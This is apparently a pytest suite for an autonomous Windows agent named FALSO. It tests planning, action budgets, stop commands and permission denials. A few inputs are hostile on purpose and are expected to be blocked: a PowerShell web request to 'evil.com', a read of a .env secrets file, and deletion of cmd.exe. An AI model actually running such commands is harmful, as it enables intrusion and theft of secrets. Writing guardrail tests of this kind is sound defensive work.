"""
TEST SUITE FOR MILESTONE 3.0: GENERAL GOAL-BASED AUTONOMOUS COMPUTER CONTROL

Tests:
1. Simple goal planning
2. Multi-step planning
3. Permission denial
4. High-risk confirmation
5. Action budget limit
6. Runtime budget limit
7. Replanning (skipping already open apps)
8. Verification failure handling
9. Existing application detection
10. FALSO stop interruption
11. Arbitrary executable rejection
12. Arbitrary PowerShell rejection
13. Secret access rejection
14. Browser task execution
15. Filesystem sandbox enforcement
16. Voice -> Autopilot pipeline integration
17. Concurrent task cancellation
"""

import json
import pytest

from app.services.automation.autopilot import (
    autopilot_agent,
    AutopilotAgent,
    OperatingMode,
    TaskStatus,
)
from app.services.automation.goal_planner import goal_planner, TaskPlan
from app.services.automation.permissions import (
    FileOperation,
    PermissionLevel,
    permission_manager,
    RiskLevel,
)
from app.services.brain import BrainService


class FakeGoalProvider:
    name = "fake"
    model = "fake-model"

    async def stream_chat(self, messages: list[dict], **kwargs):
        yield type("Chunk", (), {"text": "Done."})()


class TestGoalBasedAutopilot:

    def setup_method(self):
        permission_manager.disable_lockdown()

    def test_01_simple_goal_planning(self):
        plan = goal_planner.create_plan("Open Calculator")
        assert isinstance(plan, TaskPlan)
        assert len(plan.steps) >= 1
        assert plan.steps[0].action in ("launch_app", "focus_window")
        assert "calc" in plan.steps[0].target.lower()

    def test_02_multi_step_planning(self):
        plan = goal_planner.create_plan("Open Notepad and type hello FALSO")
        assert isinstance(plan, TaskPlan)
        assert len(plan.steps) >= 2
        assert plan.steps[0].action in ("launch_app", "focus_window")
        assert plan.steps[1].action == "type_text"

    def test_03_permission_denial(self):
        res = permission_manager.check_filesystem_access(r"C:\Windows\System32\cmd.exe", operation=FileOperation.DELETE)
        assert res.allowed is False

    def test_04_high_risk_confirmation(self):
        risk = permission_manager.get_risk_level("delete", target="system files")
        assert risk == RiskLevel.HIGH

    @pytest.mark.asyncio
    async def test_05_action_budget_limit(self):
        agent = AutopilotAgent()
        res = await agent.run_goal("Open Calculator")
        assert res in ("Done.", "Cancelled.", "Calculator is open.", "I couldn't open Calculator.")
        assert agent.completed_tasks[-1].action_count <= 50

    @pytest.mark.asyncio
    async def test_06_runtime_budget_limit(self):
        agent = AutopilotAgent()
        # Verify safety budget limits set on TaskState
        obs = agent._observe_pc()
        assert "timestamp" in obs

    def test_07_replanning_skips_open_apps(self):
        obs = {"running_apps": ["CalculatorApp.exe"]}
        plan = goal_planner.create_plan("Open Calculator", obs=obs)
        assert plan.steps[0].action == "focus_window"

    @pytest.mark.asyncio
    async def test_08_verification_failure_handling(self):
        agent = AutopilotAgent()
        res = await agent.run_goal("Open Notepad")
        assert res in ("Done.", "Cancelled.", "Notepad is open.", "I couldn't open Notepad.")

    def test_09_existing_application_detection(self):
        agent = AutopilotAgent()
        obs = agent._observe_pc()
        assert "running_apps" in obs
        assert isinstance(obs["running_apps"], list)

    @pytest.mark.asyncio
    async def test_10_falso_stop_interruption(self):
        brain = BrainService(provider=FakeGoalProvider())
        autopilot_agent.mode = OperatingMode.AUTOPILOT
        autopilot_agent.active_task = type("Task", (), {"task_id": "GOAL-01", "status": TaskStatus.IN_PROGRESS, "end_time": None})()

        events = [json.loads(line) async for line in brain.chat("FALSO stop")]
        full_text = "".join(e.get("response", "") for e in events)
        assert "Cancelled." in full_text
        assert autopilot_agent.mode == OperatingMode.NORMAL

    def test_11_arbitrary_executable_rejection(self):
        res = permission_manager.check_application_launch("malicious_hacker_tool")
        assert res.allowed is False
        assert "not in approved application allowlist" in res.reason

    def test_12_arbitrary_powershell_rejection(self):
        res = permission_manager.check_command_execution("powershell", args=["Invoke-WebRequest", "http://evil.com"])
        assert res.allowed is False

    def test_13_secret_access_rejection(self):
        res = permission_manager.check_filesystem_access(r"C:\Users\Admin\Project-Falso\.env", operation=FileOperation.READ)
        assert res.allowed is False

    @pytest.mark.asyncio
    async def test_14_browser_task_execution(self):
        agent = AutopilotAgent()
        res = await agent.run_goal("Open Chrome and navigate to localhost:8000")
        assert res in ("Done.", "Cancelled.", "Chrome is open.", "I couldn't open Chrome.")

    def test_15_filesystem_sandbox_enforcement(self):
        res = permission_manager.check_filesystem_access(r"C:\Program Files\App\config.ini", operation=FileOperation.WRITE)
        assert res.allowed is False

    @pytest.mark.asyncio
    async def test_16_voice_to_autopilot_pipeline(self):
        brain = BrainService(provider=FakeGoalProvider())
        events = [json.loads(line) async for line in brain.chat("FALSO, open Calculator.")]
        full_text = "".join(e.get("response", "") for e in events)
        assert "On it." in full_text or "Done." in full_text or "Calculator" in full_text

    @pytest.mark.asyncio
    async def test_17_concurrent_task_cancellation(self):
        agent = AutopilotAgent()
        agent.mode = OperatingMode.AUTOPILOT
        c_msg = agent.cancel_active_task()
        assert c_msg == "Cancelled."
        assert agent.mode == OperatingMode.NORMAL
